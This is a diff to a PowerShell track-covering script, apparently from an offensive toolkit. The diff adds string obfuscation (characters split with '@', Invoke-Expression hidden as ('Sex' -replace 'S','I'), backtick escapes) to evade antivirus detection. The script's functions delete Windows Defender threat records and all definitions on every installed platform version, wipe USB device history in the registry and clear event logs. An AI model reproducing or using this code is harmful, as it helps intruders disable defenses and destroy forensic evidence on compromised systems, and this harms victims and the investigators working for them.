@@ -211,7 +211,7 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
       [int]$ModRegKey = "9"   
    }
 
-
+   $MamaMia = "RUN@DL@L3@2.@EX@E" -replace '@',''
    If($IsClientAdmin -Match '^(True)$')
    {
 
@@ -237,23 +237,23 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
       $ClearList += 'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /ve /t REG_SZ /f'
       $ClearList += 'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v AlwaysUnloadDLL /t REG_SZ /d 1 /f'
       $ClearList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
-      $ClearList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+      $ClearList += "$MamaMia USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"
 
       #Paranoid function list
       $ParanoidList += 'REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /f'
       $ParanoidList += 'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /ve /t REG_SZ /f'
       $ParanoidList += 'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v AlwaysUnloadDLL /t REG_SZ /d 1 /f'
       $ParanoidList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
-      $ParanoidList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+      $ParanoidList += "$MamaMia USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"
    }
    Else
    {
       [int]$ModRegKey = [int]$ModRegKey + 2
-      #Add to list the 'update desktop' rundll32 api + registry last key accessed
+      #Add to list the 'update desktop' rundl`l32 api + registry last key accessed
       $ClearList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
-      $ClearList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+      $ClearList += "$MamaMia USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"
       $ParanoidList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
-      $ParanoidList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+      $ParanoidList += "$MamaMia USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"
    }
 
 
@@ -397,9 +397,15 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
 
          #Remove threats\signatures from defender vault
          Try{
-            Remove-MpThreat
-            $GetPlatformNumber = (Gci -Path "$Env:PROGRAMDATA\Microsoft\Windows Defender\Platform").Name|Where-Object{$_ -match '^(\d+\.+\d+\d)' }|Select -First 1
-            "$Env:PROGRAMDATA\Microsoft\Windows Defender\Platform\$GetPlatformNumber\MpCmdRun.exe -RemoveDefinitions -All"
+            $RemoveMyName = "@Re@mov@e-@MpTh@re@at" -replace '@',''
+            $RemoveMyName|&('Sex' -replace 'S','I')
+            $GetPlatformNumber = (Gci -Path "$Env:PROGRAMDATA\Microsoft\Windows Defender\Platform").Name|Where-Object{$_ -match '^(\d+\.+\d+\d)' }
+            ForEach($PlatformVersion in $GetPlatformNumber)
+            {
+               ## Remove all signatures from all installed versions of WD
+               $MamaMia = "-Rem@ov@eDef@ini@tio@ns -@Al@l" -replace '@',''
+               "$Env:PROGRAMDATA\Microsoft\Windows Defender\Platform\$PlatformVersion\MpCmdRun.exe $MamaMia"|Out-Null
+            }
          }Catch{}
 
          $PSlist = wevtutil el | Where-Object {#Note: wevtutil cl => requires Administrator rigths to run
